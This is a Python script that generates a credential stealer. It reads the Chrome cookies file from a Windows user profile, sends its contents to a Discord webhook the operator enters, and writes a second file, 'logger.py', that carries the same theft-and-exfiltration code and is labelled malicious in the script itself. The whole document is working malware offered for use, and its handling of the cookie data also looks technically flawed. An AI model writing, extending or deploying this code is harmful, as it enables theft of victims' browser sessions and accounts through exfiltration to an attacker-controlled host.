import os
import requests
from datetime import datetime

def get_browser_data():
    # Code to extract browser data and cookies goes here
    # For example, to get Chrome cookies:
    chrome_cookie_file = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'
    )
    try:
        with open(chrome_cookie_file, 'rb') as f:
            cookies = f.read()
        return cookies
    except FileNotFoundError:
        print(f'[-] Chrome cookies file not found: {chrome_cookie_file}')
        return None

def send_data_to_webhook(webhook_url, data):
    headers = {'Content-Type': 'application/json'}
    payload = {'content': f'{data.decode()}'}
    response = requests.post(webhook_url, headers=headers, json=payload)
    if response.status_code == 200:
        print(f'[+] Successfully sent data to webhook: {webhook_url}')
    else:
        print(f'[-] Error sending data to webhook: {webhook_url}')

def create_malicious_file(webhook_url):
    # Define the malicious code to be written to the file
    malicious_code = f"""
import os
import requests

def get_browser_data():
    # Code to extract browser data and cookies goes here
    # For example, to get Chrome cookies:
    chrome_cookie_file = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'
    )
    try:
        with open(chrome_cookie_file, 'rb') as f:
            cookies = f.read()
        return cookies
    except FileNotFoundError:
        print('[-] Chrome cookies file not found')
        return None

def send_data_to_webhook(webhook_url, data):
    headers = {'Content-Type': 'application/json'}
    payload = {'content': f'{data.decode()}'}
    response = requests.post(webhook_url, headers=headers, json=payload)
    if response.status_code == 200:
        print('[+] Successfully sent data to webhook')
    else:
        print('[-] Error sending data to webhook')

def main():
    browser_data = get_browser_data()
    if browser_data:
        send_data_to_webhook('{webhook_url}', browser_data)

if __name__ == '__main__':
    main()
"""
    filename = 'logger.py'
    with open(filename, 'w') as f:
        f.write(malicious_code)
    print(f'[+] Malicious file created: {filename}')

def main():
    webhook_url = input('[+] Enter your Discord webhook URL: ')
    create_malicious_file(webhook_url)

if __name__ == '__main__':
    main()
